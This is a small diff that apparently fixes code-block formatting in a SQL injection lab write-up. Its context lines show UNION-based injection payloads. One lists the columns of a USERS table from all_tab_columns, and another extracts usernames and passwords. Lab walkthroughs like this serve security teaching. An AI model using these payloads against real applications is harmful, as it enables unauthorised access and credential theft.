@@ -44,10 +44,11 @@ now retireving more the data of column
 ```sqli
 ' union select column_name, NULL from all_tab_columns where table_name='USERS_ERVCVG
 '-- 
-```sqli
+```
+
 got the column of user and password
 
-```sqli
+``` sqli
 ' union select USERNAME_HZHOFM
 , PASSWORD_MHVDJN from USERS_ERVCVG-- 
 ```
